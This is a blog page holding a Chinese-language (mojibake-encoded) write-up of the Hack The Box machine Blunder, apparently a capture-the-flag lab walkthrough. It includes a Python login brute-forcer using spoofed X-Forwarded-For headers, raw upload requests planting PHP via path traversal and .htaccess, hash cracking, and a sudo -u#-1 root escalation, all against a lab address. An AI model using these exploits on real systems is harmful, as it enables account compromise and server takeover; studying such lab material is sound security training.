<!DOCTYPE html>
<html lang="en-us">
    <head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='ç©ä¸€æ‰‹HTB
 æ‰“å¼€é¶æœºå°±ä¸€äº›æ— å…³ç´§è¦çš„æ–‡å­—ï¼Œdirsearchæ‰«ä¸€ä¸‹ç›®å½•å¯ä»¥æ‰«åˆ°ç™»å½•åå°ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°é¶æœºä½¿ç”¨äº† Bludit cms
åœ¨çœ‹äº†ä¸€äº›Bluditçš„æ¼æ´ä¹‹åï¼Œå‘ç°åœ¨æ²¡æœ‰ç™»å½•ã€æˆ‘ä»¬åˆåªæœ‰ä¸€ä¸ªåå°åœ°å€çš„æƒ…å†µä¸‹ï¼Œå¼±å£ä»¤æ¯”è¾ƒé è°±
CVE-2019-17240 Bluditæ˜¯ä¸€å¥—å¼€æºçš„è½»é‡çº§åšå®¢å†…å®¹ç®¡ç†ç³»ç»Ÿï¼ˆCMSï¼‰ã€‚
Bludit 3.9.2ç‰ˆæœ¬ä¸­çš„ bl-kernel/security.class.php ä¸€äº›ä»£ç å°†æ£€æŸ¥ä¸»æœºè¿›è¡Œçš„é”™è¯¯ç™»å½•å°è¯•æ¬¡æ•°ã€‚å¦‚æœä¸»æœºè¿›è¡Œ10æ¬¡ä¸æ­£ç¡®çš„å°è¯•ï¼Œåˆ™ä¼šæš‚æ—¶é˜»æ­¢å®ƒä»¬ï¼Œä»¥å‡è½»æš´åŠ›ç ´è§£çš„ä¼å›¾ã€‚æ”»å‡»è€…é€šè¿‡ä½¿ç”¨å¤šä¸ªä¼ªé€ çš„X-Forwarded-Foræˆ–Client-IP HTTPæ ‡å¤´åˆ©ç”¨è¯¥æ¼æ´ç»•è¿‡ä¿æŠ¤æœºåˆ¶ã€‚
çˆ†ç ´äº†åŠå¤©ï¼Œæ— æœã€‚
çœ‹äº†wpä¹‹åï¼Œæˆ‘ä»¬æ‰¾åˆ°äº†æœ¬æ¥æ²¡æœ‰è¢«dirsearchæ‰«åˆ°çš„/todo.txtï¼š
-Update the CMS-Turn off FTP - DONE-Remove old users - DONE-Inform fergus that the new blog needs images - PENDINGå¯ä»¥çŒœåˆ°ç”¨æˆ·åå¯èƒ½æ˜¯ fergus ï¼Œä½†æ˜¯å¯†ç éœ€è¦ç”¨åˆ°cewlæ¥ç”Ÿæˆå¼±å£ä»¤å­—å…¸
cewl -w wordlist.txt -d 10 -m 1 http://10.10.10.191/ç„¶åæˆ‘ä»¬åˆ©ç”¨æ”¹è£…è¿‡åçš„CVE-2019-17240çš„pocæ¥æ‰“ï¼š
#!/usr/bin/env python3import reimport requestsdef open_ressources(file_path):return [item.replace(&amp;quot;\n&amp;quot;, &amp;quot;&amp;quot;) for item in open(file_path).readlines()]host = &#39;http://10.10.10.191&#39;login_url = host &#43; &#39;/admin/login&#39;username = &#39;fergus&#39;wordlist = open_ressources(&#39;wordlist.'><title>HackTheBoxBlunder</title>

<link rel='canonical' href='https://anthem-whisper.github.io/p/hacktheboxblunder/'>

<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='HackTheBoxBlunder'>
<meta property='og:description' content='ç©ä¸€æ‰‹HTB
 æ‰“å¼€é¶æœºå°±ä¸€äº›æ— å…³ç´§è¦çš„æ–‡å­—ï¼Œdirsearchæ‰«ä¸€ä¸‹ç›®å½•å¯ä»¥æ‰«åˆ°ç™»å½•åå°ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°é¶æœºä½¿ç”¨äº† Bludit cms
åœ¨çœ‹äº†ä¸€äº›Bluditçš„æ¼æ´ä¹‹åï¼Œå‘ç°åœ¨æ²¡æœ‰ç™»å½•ã€æˆ‘ä»¬åˆåªæœ‰ä¸€ä¸ªåå°åœ°å€çš„æƒ…å†µä¸‹ï¼Œå¼±å£ä»¤æ¯”è¾ƒé è°±
CVE-2019-17240 Bluditæ˜¯ä¸€å¥—å¼€æºçš„è½»é‡çº§åšå®¢å†…å®¹ç®¡ç†ç³»ç»Ÿï¼ˆCMSï¼‰ã€‚
Bludit 3.9.2ç‰ˆæœ¬ä¸­çš„ bl-kernel/security.class.php ä¸€äº›ä»£ç å°†æ£€æŸ¥ä¸»æœºè¿›è¡Œçš„é”™è¯¯ç™»å½•å°è¯•æ¬¡æ•°ã€‚å¦‚æœä¸»æœºè¿›è¡Œ10æ¬¡ä¸æ­£ç¡®çš„å°è¯•ï¼Œåˆ™ä¼šæš‚æ—¶é˜»æ­¢å®ƒä»¬ï¼Œä»¥å‡è½»æš´åŠ›ç ´è§£çš„ä¼å›¾ã€‚æ”»å‡»è€…é€šè¿‡ä½¿ç”¨å¤šä¸ªä¼ªé€ çš„X-Forwarded-Foræˆ–Client-IP HTTPæ ‡å¤´åˆ©ç”¨è¯¥æ¼æ´ç»•è¿‡ä¿æŠ¤æœºåˆ¶ã€‚
çˆ†ç ´äº†åŠå¤©ï¼Œæ— æœã€‚
çœ‹äº†wpä¹‹åï¼Œæˆ‘ä»¬æ‰¾åˆ°äº†æœ¬æ¥æ²¡æœ‰è¢«dirsearchæ‰«åˆ°çš„/todo.txtï¼š
-Update the CMS-Turn off FTP - DONE-Remove old users - DONE-Inform fergus that the new blog needs images - PENDINGå¯ä»¥çŒœåˆ°ç”¨æˆ·åå¯èƒ½æ˜¯ fergus ï¼Œä½†æ˜¯å¯†ç éœ€è¦ç”¨åˆ°cewlæ¥ç”Ÿæˆå¼±å£ä»¤å­—å…¸
cewl -w wordlist.txt -d 10 -m 1 http://10.10.10.191/ç„¶åæˆ‘ä»¬åˆ©ç”¨æ”¹è£…è¿‡åçš„CVE-2019-17240çš„pocæ¥æ‰“ï¼š
#!/usr/bin/env python3import reimport requestsdef open_ressources(file_path):return [item.replace(&amp;quot;\n&amp;quot;, &amp;quot;&amp;quot;) for item in open(file_path).readlines()]host = &#39;http://10.10.10.191&#39;login_url = host &#43; &#39;/admin/login&#39;username = &#39;fergus&#39;wordlist = open_ressources(&#39;wordlist.'>
<meta property='og:url' content='https://anthem-whisper.github.io/p/hacktheboxblunder/'>
<meta property='og:site_name' content='wh1sper'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' />
<meta name="twitter:title" content="HackTheBoxBlunder">
<meta name="twitter:description" content="ç©ä¸€æ‰‹HTB
 æ‰“å¼€é¶æœºå°±ä¸€äº›æ— å…³ç´§è¦çš„æ–‡å­—ï¼Œdirsearchæ‰«ä¸€ä¸‹ç›®å½•å¯ä»¥æ‰«åˆ°ç™»å½•åå°ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°é¶æœºä½¿ç”¨äº† Bludit cms
åœ¨çœ‹äº†ä¸€äº›Bluditçš„æ¼æ´ä¹‹åï¼Œå‘ç°åœ¨æ²¡æœ‰ç™»å½•ã€æˆ‘ä»¬åˆåªæœ‰ä¸€ä¸ªåå°åœ°å€çš„æƒ…å†µä¸‹ï¼Œå¼±å£ä»¤æ¯”è¾ƒé è°±
CVE-2019-17240 Bluditæ˜¯ä¸€å¥—å¼€æºçš„è½»é‡çº§åšå®¢å†…å®¹ç®¡ç†ç³»ç»Ÿï¼ˆCMSï¼‰ã€‚
Bludit 3.9.2ç‰ˆæœ¬ä¸­çš„ bl-kernel/security.class.php ä¸€äº›ä»£ç å°†æ£€æŸ¥ä¸»æœºè¿›è¡Œçš„é”™è¯¯ç™»å½•å°è¯•æ¬¡æ•°ã€‚å¦‚æœä¸»æœºè¿›è¡Œ10æ¬¡ä¸æ­£ç¡®çš„å°è¯•ï¼Œåˆ™ä¼šæš‚æ—¶é˜»æ­¢å®ƒä»¬ï¼Œä»¥å‡è½»æš´åŠ›ç ´è§£çš„ä¼å›¾ã€‚æ”»å‡»è€…é€šè¿‡ä½¿ç”¨å¤šä¸ªä¼ªé€ çš„X-Forwarded-Foræˆ–Client-IP HTTPæ ‡å¤´åˆ©ç”¨è¯¥æ¼æ´ç»•è¿‡ä¿æŠ¤æœºåˆ¶ã€‚
çˆ†ç ´äº†åŠå¤©ï¼Œæ— æœã€‚
çœ‹äº†wpä¹‹åï¼Œæˆ‘ä»¬æ‰¾åˆ°äº†æœ¬æ¥æ²¡æœ‰è¢«dirsearchæ‰«åˆ°çš„/todo.txtï¼š
-Update the CMS-Turn off FTP - DONE-Remove old users - DONE-Inform fergus that the new blog needs images - PENDINGå¯ä»¥çŒœåˆ°ç”¨æˆ·åå¯èƒ½æ˜¯ fergus ï¼Œä½†æ˜¯å¯†ç éœ€è¦ç”¨åˆ°cewlæ¥ç”Ÿæˆå¼±å£ä»¤å­—å…¸
cewl -w wordlist.txt -d 10 -m 1 http://10.10.10.191/ç„¶åæˆ‘ä»¬åˆ©ç”¨æ”¹è£…è¿‡åçš„CVE-2019-17240çš„pocæ¥æ‰“ï¼š
#!/usr/bin/env python3import reimport requestsdef open_ressources(file_path):return [item.replace(&amp;quot;\n&amp;quot;, &amp;quot;&amp;quot;) for item in open(file_path).readlines()]host = &#39;http://10.10.10.191&#39;login_url = host &#43; &#39;/admin/login&#39;username = &#39;fergus&#39;wordlist = open_ressources(&#39;wordlist.">
    </head>
    <body class="">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            if(!localStorage.getItem(colorSchemeKey)){
                localStorage.setItem(colorSchemeKey, "auto");
            }
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.body.dataset.scheme = 'dark';
        } else {
            document.body.dataset.scheme = 'light';
        }
    })();
</script><div class="container main-container flex on-phone--column extended article-page with-toolbar">
            <aside class="sidebar left-sidebar sticky">
    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
        <span class="hamburger-box">
            <span class="hamburger-inner"></span>
        </span>
    </button>

    <header class="site-info">
        
            <figure class="site-avatar">
                
                    
                    
                    
                        
                        <img src="/img/avatar_hu493b2ad2ace11203a689e4edf1306ab0_73291_300x0_resize_box_2.png" width="300"
                            height="300" class="site-logo" loading="lazy" alt="Avatar">
                    
                

                
                    <span class="emoji">ğŸ¥</span>
                
            </figure>
        
        <h1 class="site-name"><a href="https://anthem-whisper.github.io/">wh1sper</a></h1>
        <h2 class="site-description">ä¸“æ³¨Webå®‰å…¨å’Œä»£ç å®¡è®¡</h2>
    </header>

    <ol class="menu" id="main-menu">
        
        
        

        <li >
            <a href='/about'>
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="7" r="4" />
  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
</svg>



                
                <span>About</span>
            </a>
        </li>
        
        

        <li >
            <a href='/archives'>
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <rect x="3" y="4" width="18" height="4" rx="2" />
  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
  <line x1="10" y1="12" x2="14" y2="12" />
</svg>



                
                <span>Archives</span>
            </a>
        </li>
        
        

        <li >
            <a href='/'>
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="5 12 3 12 12 3 21 12 19 12" />
  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
</svg>



                
                <span>Home</span>
            </a>
        </li>
        
        

        <li >
            <a href='/search'>
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="10" cy="10" r="7" />
  <line x1="21" y1="21" x2="15" y2="15" />
</svg>



                
                <span>Search</span>
            </a>
        </li>
        

        
            <li id="dark-mode-toggle">
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="8" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="16" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                <span>Dark Mode</span>
            </li>
        
    </ol>
</aside>

            <main class="main full-width">
    <div id="article-toolbar">
        <a href="https://anthem-whisper.github.io/" class="back-home">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="15 6 9 12 15 18" />
</svg>



            <span>Back</span>
        </a>
    </div>

    <article class="main-article">
    <header class="article-header">

    <div class="article-details">
    

    <h2 class="article-title">
        <a href="/p/hacktheboxblunder/">HackTheBoxBlunder</a>
    </h2>

    </div>
</header>

    <section class="article-content">
    <p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120180606.png" alt=""  /></p>
<p>ç©ä¸€æ‰‹HTB</p>
<hr>
<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120180614.png" alt="img"  /></p>
<p>æ‰“å¼€é¶æœºå°±ä¸€äº›æ— å…³ç´§è¦çš„æ–‡å­—ï¼Œdirsearchæ‰«ä¸€ä¸‹ç›®å½•å¯ä»¥æ‰«åˆ°ç™»å½•åå°ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°é¶æœºä½¿ç”¨äº† <code>Bludit</code> cms</p>
<p>åœ¨çœ‹äº†ä¸€äº›Bluditçš„æ¼æ´ä¹‹åï¼Œå‘ç°åœ¨æ²¡æœ‰ç™»å½•ã€æˆ‘ä»¬åˆåªæœ‰ä¸€ä¸ªåå°åœ°å€çš„æƒ…å†µä¸‹ï¼Œå¼±å£ä»¤æ¯”è¾ƒé è°±</p>
<h3 id="cve-2019-17240httpsgithubcombluditbluditpull1090"><a class="link" href="https://github.com/bludit/bludit/pull/1090"  target="_blank" rel="noopener"
    >CVE-2019-17240</a></h3>
<p>Bluditæ˜¯ä¸€å¥—å¼€æºçš„è½»é‡çº§åšå®¢å†…å®¹ç®¡ç†ç³»ç»Ÿï¼ˆCMSï¼‰ã€‚</p>
<p>Bludit 3.9.2ç‰ˆæœ¬ä¸­çš„ <code>bl-kernel/security.class.php</code> ä¸€äº›ä»£ç å°†æ£€æŸ¥ä¸»æœºè¿›è¡Œçš„é”™è¯¯ç™»å½•å°è¯•æ¬¡æ•°ã€‚å¦‚æœä¸»æœºè¿›è¡Œ10æ¬¡ä¸æ­£ç¡®çš„å°è¯•ï¼Œåˆ™ä¼šæš‚æ—¶é˜»æ­¢å®ƒä»¬ï¼Œä»¥å‡è½»æš´åŠ›ç ´è§£çš„ä¼å›¾ã€‚æ”»å‡»è€…é€šè¿‡ä½¿ç”¨å¤šä¸ªä¼ªé€ çš„X-Forwarded-Foræˆ–Client-IP HTTPæ ‡å¤´åˆ©ç”¨è¯¥æ¼æ´ç»•è¿‡ä¿æŠ¤æœºåˆ¶ã€‚</p>
<p>çˆ†ç ´äº†åŠå¤©ï¼Œæ— æœã€‚</p>
<p>çœ‹äº†wpä¹‹åï¼Œæˆ‘ä»¬æ‰¾åˆ°äº†æœ¬æ¥æ²¡æœ‰è¢«dirsearchæ‰«åˆ°çš„<code>/todo.txt</code>ï¼š</p>
<pre><code>-Update the CMS
-Turn off FTP - DONE
-Remove old users - DONE
-Inform fergus that the new blog needs images - PENDING
</code></pre><p>å¯ä»¥çŒœåˆ°ç”¨æˆ·åå¯èƒ½æ˜¯ <code>fergus</code> ï¼Œä½†æ˜¯å¯†ç éœ€è¦ç”¨åˆ°<a class="link" href="https://www.jianshu.com/p/7906cc79fb9c"  target="_blank" rel="noopener"
    >cewl</a>æ¥ç”Ÿæˆå¼±å£ä»¤å­—å…¸</p>
<pre><code>cewl -w wordlist.txt -d 10 -m 1 http://10.10.10.191/
</code></pre><p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120180623.png" alt="img"  /></p>
<p>ç„¶åæˆ‘ä»¬åˆ©ç”¨æ”¹è£…è¿‡åçš„CVE-2019-17240çš„<a class="link" href="https://github.com/bludit/bludit/pull/1090"  target="_blank" rel="noopener"
    >poc</a>æ¥æ‰“ï¼š</p>
<pre><code>#!/usr/bin/env python3
import re
import requests
 
def open_ressources(file_path):
    return [item.replace(&quot;\n&quot;, &quot;&quot;) for item in open(file_path).readlines()]
 
host = 'http://10.10.10.191'
login_url = host + '/admin/login'
username = 'fergus'
wordlist = open_ressources('wordlist.txt')
 
for password in wordlist:
    session = requests.Session()
    login_page = session.get(login_url)
    csrf_token = re.search('input.+?name=&quot;tokenCSRF&quot;.+?value=&quot;(.+?)&quot;', login_page.text).group(1)
 
    print('[*] Trying: {p}'.format(p = password))
 
    headers = {
        'X-Forwarded-For': password,
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
        'Referer': login_url
    }
 
    data = {
        'tokenCSRF': csrf_token,
        'username': username,
        'password': password,
        'save': ''
    }
 
    login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)
 
    if 'location' in login_result.headers:
        if '/admin/dashboard' in login_result.headers['location']:
            print()
            print('SUCCESS: Password found!')
            print('Use {u}:{p} to login.'.format(u = username, p = password))
            print()
            break
</code></pre><p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120180633.png" alt="img"  /></p>
<p>æœ€ååœ¨ç¬¬ä¸€ç™¾å¤šä½çˆ†ç ´å‡ºç”¨æˆ·å<code>fergus</code>å¯†ç <code>RolandDeschain</code></p>
<p>è¿›å…¥åå°ã€‚</p>
<h3 id="cve-2019-16113httpsgithubcombluditbluditissues1081"><a class="link" href="https://github.com/bludit/bludit/issues/1081"  target="_blank" rel="noopener"
    >CVE-2019-16113</a></h3>
<p>æ–‡ç« è¯´çš„å¾ˆè¯¦ç»†ï¼Œé€šè¿‡æ›´æ”¹uuidçš„å€¼æ¥æŒ‡å®šä¸Šä¼ æ–‡ä»¶çš„ä½ç½®ï¼Œä¹Ÿå°±æ˜¯ç›®å½•ç©¿è¶Š</p>
<p>ç„¶åä¸ç¬¦åˆå›¾ç‰‡åç¼€çš„æ–‡ä»¶ä¼šå…ˆè¢«ç§»åŠ¨åˆ°/bl-content/tmp/temp/ç›®å½•ä¸‹ï¼Œç„¶åè¿›è¡Œåˆ é™¤ï¼Œæˆ‘ä»¬åˆ©ç”¨intruderè¿›è¡Œæ¡ä»¶ç«äº‰</p>
<p>ä¸Šä¼ .htaccessæ–‡ä»¶ï¼ŒæŠŠjpgè§£æä¸ºphpï¼š</p>
<pre><code>POST /admin/ajax/upload-images HTTP/1.1
Host: 10.10.10.191
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.Â§191Â§/admin/edit-content/blender
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------1197595220477940257964308486
Content-Length: 560
Connection: close
Cookie: BLUDIT-KEY=k35lg8hngofh6kvif51i37m0o5
 
-----------------------------1197595220477940257964308486
Content-Disposition: form-data; name=&quot;images[]&quot;; filename=&quot;.htaccess&quot;
Content-Type: image/jpeg
 
RewriteEngine off
AddType application/x-httpd-php jpg
-----------------------------1197595220477940257964308486
Content-Disposition: form-data; name=&quot;uuid&quot;
 
21b8a0e80e433cb7453e7d72382c6bc1
-----------------------------1197595220477940257964308486
Content-Disposition: form-data; name=&quot;tokenCSRF&quot;
 
c623c868d292dec9b4e11c104f54c9e3dde971ee
-----------------------------1197595220477940257964308486--
</code></pre><p>ä¸Šä¼ æ¶æ„wh1sper.jpgåˆ°/bl-content/tmp/temp/ç›®å½•ï¼š</p>
<pre><code>POST /admin/ajax/upload-images HTTP/1.1
Host: 10.10.10.191
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.Â§191Â§/admin/edit-content/blender
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------1197595220477940257964308486
Content-Length: 589
Connection: close
Cookie: BLUDIT-KEY=k35lg8hngofh6kvif51i37m0o5
 
-----------------------------1197595220477940257964308486
Content-Disposition: form-data; name=&quot;images[]&quot;; filename=&quot;wh1sper.jpg&quot;
Content-Type: image/jpeg
 
&lt;?php file_put_contetns(&quot;../wh1sper.php&quot;,&quot;&lt;?php phpinfo();?&gt;&quot;);?&gt;
-----------------------------1197595220477940257964308486
Content-Disposition: form-data; name=&quot;uuid&quot;
 
21b8a0e80e433cb7453e7d72382c6bc1/../../../tmp/temp
-----------------------------1197595220477940257964308486
Content-Disposition: form-data; name=&quot;tokenCSRF&quot;
 
c623c868d292dec9b4e11c104f54c9e3dde971ee
-----------------------------1197595220477940257964308486--
</code></pre><p>è·å¾—shellï¼š</p>
<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120180645.png" alt="img"  /></p>
<p>æ‹¿åˆ°äº†shellä¹‹åæ ¹ç›®å½•å¹¶æ²¡æœ‰æˆ‘ä»¬æƒ³è¦çš„ä¸œè¥¿ï¼Œæˆ‘ä»¬è¿™ä¸ªè´¦æˆ·å¹¶æ²¡æœ‰æƒé™æŸ¥çœ‹/rootç›®å½•ï¼›</p>
<p>æˆ‘ä»¬å¯ä»¥åœ¨wwwç›®å½•ä¸‹çœ‹åˆ°å¦å¤–ä¸€ä¸ªç‰ˆæœ¬çš„bluditï¼Œå¹¶ä¸”å†user.phpé‡Œé¢å¯ä»¥æ‰¾åˆ°å¦å¤–ä¸€ä¸ªè´¦æˆ·çš„è´¦å·å¯†ç </p>
<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120180653.png" alt="img"  /></p>
<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120180703.png" alt="img"  /></p>
<p>åˆ©ç”¨kaliè‡ªå¸¦çš„ <code>hash-identifier</code> è¿›è¡Œè¯†åˆ«ï¼š</p>
<pre><code>root@wh1sper:~# hash-identifier
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: faca404fd5c0a31cf1897b823c695c85cffeb98d
 
Possible Hashs:
[+] SHA-1
[+] MySQL5 - SHA-1(SHA-1($pass))
</code></pre><p><a href="https://md5decrypt.net/en/Sha1/">https://md5decrypt.net/en/Sha1/</a>è§£ç å¾—åˆ°:<code>Password120</code></p>
<p>å†°èç»ˆç«¯ï¼š</p>
<pre><code>su hugo
Password120
</code></pre><p>æˆ‘ä»¬åˆ‡æ¢åˆ°äº†hugoç”¨æˆ·ï¼Œä½†æ˜¯è¿˜æ˜¯æ²¡æœ‰rootæƒé™</p>
<pre><code>hugo@blunder:/var/www/bludit-3.9.2$ sudo -l
 
Password: Password120
 
Matching Defaults entries for hugo on blunder:
env_reset, mail_badpass,
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
User hugo may run the following commands on blunder:
(ALL, !root) /bin/bash
</code></pre><h3 id="cve-2019-14287httpswwwexploit-dbcomexploits47502"><a class="link" href="https://www.exploit-db.com/exploits/47502"  target="_blank" rel="noopener"
    >CVE-2019-14287</a></h3>
<p>Google <code>(ALL, !root) /bin/bash</code> ä¹‹åå¯ä»¥ç”¨<a class="link" href="https://www.exploit-db.com/exploits/47502"  target="_blank" rel="noopener"
    >è¿™ç§æ–¹å¼</a>ææƒï¼š</p>
<pre><code>hugo@blunder:/var/www/bludit-3.9.2$ sudo -u#-1 /bin/bash
 
root@blunder:/var/www/bludit-3.9.2# cat /root/root.txt
 
b1466707cf5be5f66b8be2c4a525e066
root@blunder:/var/www/bludit-3.9.2#
</code></pre><p>å°±å¯ä»¥å¾—åˆ°root.txtäº†ï¼Œå¦å¤–homeç›®å½•ä¸‹è¿˜æœ‰ä¸ªuser.txt</p>

</section>


    <footer class="article-footer">
    

    
    <section class="article-copyright">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
</svg>



        <span>Licensed under CC BY-NC-SA 4.0</span>
    </section>
    </footer>

    
</article>

    <aside class="related-contents--wrapper">
    
    
</aside>


    
        
    <div class="disqus-container">
    <div id="disqus_thread"></div>
<script type="application/javascript">
    var disqus_config = function () {
    
    
    
    };
    (function() {
        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
            return;
        }
        var d = document, s = d.createElement('script'); s.async = true;
        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
</div>

<style>
    .disqus-container {
        background-color: var(--card-background);
        border-radius: var(--card-border-radius);
        box-shadow: var(--shadow-l1);
        padding: var(--card-padding);
    }
</style>

<script>
    window.addEventListener('onColorSchemeChange', (e) => {
        if (DISQUS) {
            DISQUS.reset({
                reload: true
            });
        }
    })
</script>

    

    <footer class="site-footer">
    <section class="copyright">
        &copy; 
        
            2020 - 
        
        2021 wh1sper
    </section>
    
    <section class="powerby">
        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="2.2.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
    </section>
</footer>
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
